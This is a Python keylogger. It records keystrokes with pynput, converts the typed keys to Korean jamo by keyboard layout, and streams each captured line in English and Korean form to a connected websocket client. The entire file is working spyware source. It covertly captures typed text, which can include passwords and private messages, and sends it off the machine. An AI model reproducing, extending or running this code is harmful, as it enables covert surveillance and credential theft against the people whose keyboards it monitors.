# -*- coding: utf-8 -*-
from pynput.keyboard import Listener, Key
import asyncio
import websockets
import queue
import sys

logs = ''
saveEn = queue.Queue()
saveKo = queue.Queue()

cons = {'r':'ㄱ', 'R':'ㄲ', 's':'ㄴ', 'e':'ㄷ', 'E':'ㄸ', 'f':'ㄹ', 'a':'ㅁ', 'q':'ㅂ', 'Q':'ㅃ', 't':'ㅅ', 'T':'ㅆ',
        'd':'ㅇ', 'w':'ㅈ', 'W':'ㅉ', 'c':'ㅊ', 'z':'ㅋ', 'x':'ㅌ', 'v':'ㅍ', 'g':'ㅎ'}

vowels = {'k':'ㅏ', 'o':'ㅐ', 'i':'ㅑ', 'O':'ㅒ', 'j':'ㅓ', 'p':'ㅔ', 'u':'ㅕ', 'P':'ㅖ', 'h':'ㅗ', 'hk':'ㅘ', 'ho':'ㅙ', 'hl':'ㅚ',
          'y':'ㅛ', 'n':'ㅜ', 'nj':'ㅝ', 'np':'ㅞ', 'nl':'ㅟ', 'b':'ㅠ', 'm':'ㅡ', 'ml':'ㅢ', 'l':'ㅣ'}

cons_double = {'rt':'ㄳ', 'sw':'ㄵ', 'sg':'ㄶ', 'fr':'ㄺ', 'fa':'ㄻ', 'fq':'ㄼ', 'ft':'ㄽ', 'fx':'ㄾ', 'fv':'ㄿ', 'fg':'ㅀ', 'qt':'ㅄ'}

def convert_to_korean(text):

    converted_text = ''
    i = 0
    while i < len(text):
        char = text[i]
        if i + 1 < len(text):
            double_char = text[i:i+2]
            if double_char in cons_double:
                converted_text += cons_double[double_char]
                i += 2
                continue
        if char in cons:
            converted_text += cons[char]
        elif char in vowels:
            converted_text += vowels[char]
        else:
            converted_text += char
        i += 1
    return converted_text

def on_press(key):
    global logs

    if key == Key.enter:
        try:
            converted_text = convert_to_korean(logs)
            saveEn.put(logs)
            saveKo.put(converted_text)
        except:
            print('Server error!')

        logs = ''
    else:
        logs += str(key).replace("'", "")

async def log(websocket, path):
    print('Keylogger Start...')
    listener = Listener(on_press=on_press)
    listener.start()
    try:
        while True:
            try:
                if not saveEn.empty():
                    dataEn = saveEn.get()
                    dataKo = saveKo.get()
                    data = f'En:{dataEn}\n Ko:{dataKo}'
                    await websocket.send(data)
                else:
                    pass
                await asyncio.sleep(1)
            except Exception as e:
                print(f'Keylogger error: {e}')
                listener.stop()
                listener.join()
                await websocket.close()
                break  
            except KeyboardInterrupt:
                sys.exit(0)
                break
            except websockets.exceptions.ConnectionClosedOK:
                break    
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f'Keylogger error: {e}')
    except websockets.exceptions.ConnectionClosedOK:
        pass
    except websockets.ConnectionClosed:
        listener.join()
        pass